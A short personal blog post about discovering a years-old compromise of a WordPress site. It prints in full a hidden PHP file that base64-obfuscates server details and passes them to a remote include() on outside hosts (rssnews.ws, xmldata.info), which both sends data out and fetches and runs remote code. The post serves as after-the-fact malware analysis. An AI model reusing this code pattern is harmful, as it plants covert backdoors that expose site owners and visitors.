---
title: "An old WordPress hack I found"
date: "Fri Jan 21 14:45:00 -0500 2022"
category: dev
redirect_from: /dev/2022/an-old-wordpress-hack-i-found.html
---

I was poking through old WordPress backups I have and noticed a strange
`wp-content/85060.php` file. Turns out one of my sites was hacked back in 2006
or 2007 and I had never noticed.

The file looks to be a surveillance script of some sort that sends server
information to another site `rssnews.ws` or `xmldata.info`.

```php
<? error_reporting(0);
$s="e";
$a=(isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $HTTP_HOST);
$b=(isset($_SERVER["SERVER_NAME"]) ? $_SERVER["SERVER_NAME"] : $SERVER_NAME);
$c=(isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : $REQUEST_URI);
$d=(isset($_SERVER["PHP_SELF"]) ? $_SERVER["PHP_SELF"] : $PHP_SELF);
$e=(isset($_SERVER["QUERY_STRING"]) ? $_SERVER["QUERY_STRING"] : $QUERY_STRING);
$f=(isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : $HTTP_REFERER);
$g=(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : $HTTP_USER_AGENT);
$h=(isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : $REMOTE_ADDR);
$i=(isset($_SERVER["SCRIPT_FILENAME"]) ? $_SERVER["SCRIPT_FILENAME"] : $SCRIPT_FILENAME);
$j=(isset($_SERVER["HTTP_ACCEPT_LANGUAGE"]) ? $_SERVER["HTTP_ACCEPT_LANGUAGE"] : $HTTP_ACCEPT_LANGUAGE);

$str=base64_encode($a).".".
	base64_encode($b).".".
	base64_encode($c).".".
	base64_encode($d).".".
	base64_encode($e).".".
	base64_encode($f).".".
	base64_encode($g).".".
	base64_encode($h).".$s.".
	base64_encode($i).".".
	base64_encode($j);

// base64_decode('d3d3My5yc3NuZXdzLndz") #=> rssnews.ws
if ((include(base64_decode("aHR0cDovLw==").base64_decode("d3d3My5yc3NuZXdzLndz")."/?".$str))) {
} else {
	// base64_decode("aHR0cDovLw==")             #=> http://
	// base64_decode("d3d3My54bWxkYXRhLmluZm8=") #=> www3.xmldata.info
	include(base64_decode("aHR0cDovLw==").base64_decode("d3d3My54bWxkYXRhLmluZm8=")."/?".$str);
} ?>
```

No idea what this would be for, and I didn't see any other malicious files
present. Presumably this was intended to give an attacker a list of vulnerable
sites that they could exploit later.

Fun to find out about a hack 15 years later!
